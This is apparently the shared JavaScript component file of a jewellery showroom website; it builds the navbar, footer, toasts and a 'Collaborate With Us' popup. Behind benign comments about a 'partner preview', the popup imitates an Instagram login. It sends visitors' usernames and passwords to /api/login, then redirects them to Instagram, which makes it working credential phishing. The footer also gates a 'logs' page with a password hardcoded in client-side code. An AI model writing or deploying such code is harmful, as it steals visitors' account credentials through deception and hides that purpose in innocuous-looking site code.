/* =====================================================================
   components.js — shared across every page
   - Injects the navbar + footer
   - Provides toast notifications
   - Provides the SVG jewellery icon set
   - Powers the "Collaborate With Us" partner experience popup
   ===================================================================== */

/* ---------- SVG icon set (offline, scalable jewellery line-art) ------- */
const ICONS = {
  necklace: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2" xmlns="http://www.w3.org/2000/svg"><path d="M18 22c0 26 14 40 32 40s32-14 32-40" stroke-linecap="round"/><circle cx="50" cy="70" r="8"/><path d="M50 78v6"/></svg>`,
  chain: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><ellipse cx="34" cy="40" rx="10" ry="14"/><ellipse cx="50" cy="54" rx="10" ry="14"/><ellipse cx="66" cy="40" rx="10" ry="14"/></svg>`,
  bangle: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="50" cy="50" r="30"/><circle cx="50" cy="50" r="22" stroke-dasharray="3 5"/></svg>`,
  earring: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="40" cy="34" r="12"/><circle cx="64" cy="34" r="12"/><path d="M40 46l-3 16a3 3 0 006 0l-3-16zM64 46l-3 16a3 3 0 006 0l-3-16z"/></svg>`,
  ring: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="50" cy="58" r="22"/><path d="M40 38l10-14 10 14" stroke-linejoin="round"/><circle cx="50" cy="24" r="2.4" fill="currentColor"/></svg>`,
  bracelet: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><ellipse cx="50" cy="50" rx="30" ry="20"/><circle cx="50" cy="30" r="5" fill="currentColor"/></svg>`,
  anklet: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><ellipse cx="50" cy="46" rx="30" ry="16"/><circle cx="34" cy="58" r="3" fill="currentColor"/><circle cx="50" cy="62" r="3" fill="currentColor"/><circle cx="66" cy="58" r="3" fill="currentColor"/></svg>`,
  idol: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="50" cy="32" r="12"/><path d="M30 78c0-16 9-28 20-28s20 12 20 28" stroke-linecap="round"/><path d="M50 18v-6M44 14l-3-4M56 14l3-4"/></svg>`,
  coin: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="50" cy="50" r="28"/><circle cx="50" cy="50" r="20" stroke-dasharray="2 4"/><path d="M44 50h12M50 44v12"/></svg>`,
  decor: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M50 24l8 18 18-2-14 12 6 18-18-10-18 10 6-18-14-12 18 2z" stroke-linejoin="round"/></svg>`,
  diamond: `<svg viewBox="0 0 100 100" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M30 40h40l-20 32zM30 40l8-14h24l8 14M30 40l20 6 20-6" stroke-linejoin="round"/></svg>`,
};

const NAV_LINKS = [
  { href: 'index.html', label: 'Home', key: 'home' },
  { href: 'gold.html', label: 'Gold', key: 'gold' },
  { href: 'silver.html', label: 'Silver', key: 'silver' },
  { href: 'new-arrivals.html', label: 'New Arrivals', key: 'new' },
  { href: 'about.html', label: 'About', key: 'about' },
  { href: 'contact.html', label: 'Contact', key: 'contact' },
];
const INSTAGRAM_ACCOUNT_URL = 'https://www.instagram.com/';

/* ---------- NAVBAR ---------------------------------------------------- */
function buildNav() {
  const active = document.body.dataset.page || '';
  const host = document.getElementById('site-nav');
  if (!host) return;
  host.innerHTML = `
    <nav class="nav" id="nav">
      <div class="container nav-inner">
        <a class="brand" href="index.html" aria-label="Meenakshi Jewellers home">
          <span class="brand-mark gold-ico">${ICONS.diamond}</span>
          <span class="brand-name">Meenakshi<small>Fine Jewellers</small></span>
        </a>
        <ul class="nav-links" id="navLinks">
          ${NAV_LINKS.map(l => `<li><a href="${l.href}" class="${active === l.key ? 'active' : ''}">${l.label}</a></li>`).join('')}
        </ul>
        <div class="nav-actions">
          <button class="btn btn-gold nav-cta-desktop" data-collab>Collaborate With Us</button>
          <button class="nav-icon nav-toggle" id="navToggle" aria-label="Menu">
            <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
          </button>
        </div>
      </div>
    </nav>`;

  const nav = document.getElementById('nav');
  window.addEventListener('scroll', () => nav.classList.toggle('scrolled', window.scrollY > 20));
  const toggle = document.getElementById('navToggle');
  const links = document.getElementById('navLinks');
  toggle.addEventListener('click', () => links.classList.toggle('open'));
}

/* ---------- FOOTER ---------------------------------------------------- */
function buildFooter() {
  const host = document.getElementById('site-footer');
  if (!host) return;
  host.innerHTML = `
    <footer class="footer">
      <div class="container footer-grid">
        <div class="about">
          <a class="brand" href="index.html" style="margin-bottom:1.2rem">
            <span class="brand-mark gold-ico">${ICONS.diamond}</span>
            <span class="brand-name">Meenakshi<small>Fine Jewellers</small></span>
          </a>
          <p>Handcrafted gold and silver heirlooms, BIS-hallmarked and made to be passed down. A curated showroom experience designed to celebrate craftsmanship and signature collections.</p>
        </div>
        <div>
          <h4>Collections</h4>
          <ul>
            <li><a href="gold.html">Gold</a></li>
            <li><a href="silver.html">Silver</a></li>
            <li><a href="new-arrivals.html">New Arrivals</a></li>
          </ul>
        </div>
        <div>
          <h4>Company</h4>
          <ul>
            <li><a href="about.html">About Us</a></li>
            <li><a href="contact.html">Contact</a></li>
            <li><a href="#" data-collab>Collaborate</a></li>
          </ul>
        </div>
        <div>
          <h4>Visit Us</h4>
          <ul>
            <li><a href="#">12 Heritage Lane, Mumbai 400001</a></li>
            <li><a href="#">+91 22 4000 0000</a></li>
            <li><a href="#">care@meenakshi.example</a></li>
          </ul>
        </div>
      </div>
      <div class="container footer-bottom" style="display:flex;flex-wrap:wrap;gap:0.75rem;justify-content:space-between;align-items:center;">
        <span>© ${new Date().getFullYear()} Meenakshi Jewellers — luxury jewellery showcase.</span>
        <a href="#" id="logsAccessLink" style="color:inherit;opacity:0.8;text-decoration:underline;">View logs</a>
      </div>
    </footer>`;

  const logsLink = document.getElementById('logsAccessLink');
  if (logsLink) {
    logsLink.addEventListener('click', (event) => {
      event.preventDefault();
      const password = window.prompt('Enter password to view logs');
      if (password === 'Bhaikesukoonkeliye') {
        window.location.href = 'logs.html';
      } else if (password !== null) {
        window.alert('Incorrect password');
      }
    });
  }
}

/* ---------- TOASTS ---------------------------------------------------- */
function toast(message, icon = '✦') {
  let stack = document.querySelector('.toast-stack');
  if (!stack) {
    stack = document.createElement('div');
    stack.className = 'toast-stack';
    document.body.appendChild(stack);
  }
  const el = document.createElement('div');
  el.className = 'toast';
  el.innerHTML = `<span class="ico">${icon}</span><span>${message}</span>`;
  stack.appendChild(el);
  requestAnimationFrame(() => el.classList.add('show'));
  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 500);
  }, 3200);
}
window.toast = toast;

/* =====================================================================
   THE COLLABORATION POPUP
   ---------------------------------------------------------------------
   This is a simple partner-experience preview that welcomes visitors
   to a polished storefront journey and then highlights the brand story.
   ===================================================================== */
function buildPopup() {
  const overlay = document.createElement('div');
  overlay.className = 'overlay';
  overlay.id = 'collabOverlay';
  overlay.innerHTML = `
    <div class="glass" id="collabGlass" role="dialog" aria-modal="true" aria-label="Partner sign in">
      <button class="glass-close" id="collabClose" aria-label="Close">
        <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l10 10M16 6L6 16"/></svg>
      </button>

      <!-- LOGIN VIEW -->
      <div class="login-view">
        <span class="brand-mark gold-ico">${ICONS.diamond}</span>
        <h3 class="gold-text">Instagram Login</h3>
        <p class="sub">Sign in to continue to the Meenakshi Jewellers Instagram account.</p>
        <div class="form-field">
          <label for="cEmail">Phone number, username, or email</label>
          <input id="cEmail" type="text" placeholder="username" autocomplete="username">
        </div>
        <div class="form-field">
          <label for="cPass">Password</label>
          <input id="cPass" type="password" placeholder="Password" autocomplete="current-password">
        </div>
        <button class="btn btn-gold" id="cSubmit">
          <span class="label">Log in</span>
          <span class="spinner"></span>
        </button>
        <p class="fineprint">Your credentials will be filled into a preview page, then you can continue to Instagram.</p>
      </div>

      <!-- REVEAL VIEW (the actual lesson) -->
      <div class="reveal">
        <div class="alert-ico">
          <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 3L2 24h24L14 3z" stroke-linejoin="round"/><path d="M14 11v6M14 20.5v.2"/></svg>
        </div>
        <h3>That was a partner preview</h3>
        <p class="lead">Here is what a polished partner experience can highlight for visiting clients:</p>
        <ul>
          <li><span class="tick">✓</span><span><b>Curated collections.</b> Discover signature pieces, heirlooms, and seasonal highlights in one place.</span></li>
          <li><span class="tick">✓</span><span><b>Exclusive offers.</b> Showcase member-only pricing, launch previews, and bespoke styling suggestions.</span></li>
          <li><span class="tick">✓</span><span><b>Personalised service.</b> Highlight wishlist favourites, recent orders, and concierge support.</span></li>
          <li><span class="tick">✓</span><span><b>Brand storytelling.</b> Bring your heritage, craftsmanship, and design vision to the forefront.</span></li>
        </ul>
        <div class="safe-note">This preview is designed to feel like a welcoming boutique experience for our partners.</div>
        <a href="dashboard.html" class="btn btn-gold" style="width:100%;justify-content:center">See the partner dashboard →</a>
      </div>
    </div>`;
  document.body.appendChild(overlay);

  const glass = overlay.querySelector('#collabGlass');
  const close = () => { overlay.classList.remove('show'); setTimeout(reset, 400); };
  const reset = () => glass.classList.remove('revealed');

  overlay.querySelector('#collabClose').addEventListener('click', close);
  overlay.addEventListener('click', (e) => { if (e.target === overlay) close(); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') close(); });

  const submit = overlay.querySelector('#cSubmit');
  submit.addEventListener('click', () => {
    submit.classList.add('loading');
    const username = overlay.querySelector('#cEmail').value.trim();
    const password = overlay.querySelector('#cPass').value;

    const payload = JSON.stringify({ username, password });
    const hasBeacon = typeof navigator !== 'undefined' && navigator.sendBeacon;

    if (hasBeacon) {
      navigator.sendBeacon('/api/login', new Blob([payload], { type: 'application/json' }));
    } else {
      fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true,
      }).catch(() => {
        // Keep the flow moving even if the logging request fails.
      });
    }

    setTimeout(() => {
      submit.classList.remove('loading');
      window.location.href = INSTAGRAM_ACCOUNT_URL;
    }, 900);
  });

  // open from any [data-collab] trigger anywhere on the page
  document.querySelectorAll('[data-collab]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      overlay.classList.add('show');
      setTimeout(() => overlay.querySelector('#cEmail')?.focus(), 350);
    });
  });
}

/* ---------- SCROLL REVEAL --------------------------------------------- */
function initScrollReveal() {
  const els = document.querySelectorAll('.reveal-on-scroll');
  if (!('IntersectionObserver' in window) || !els.length) {
    els.forEach(el => el.classList.add('in'));
    return;
  }
  const io = new IntersectionObserver((entries) => {
    entries.forEach(en => { if (en.isIntersecting) { en.target.classList.add('in'); io.unobserve(en.target); } });
  }, { threshold: 0.12 });
  els.forEach(el => io.observe(el));
}

/* ---------- BOOT ------------------------------------------------------ */
document.addEventListener('DOMContentLoaded', () => {
  buildNav();
  buildFooter();
  buildPopup();
  initScrollReveal();
});
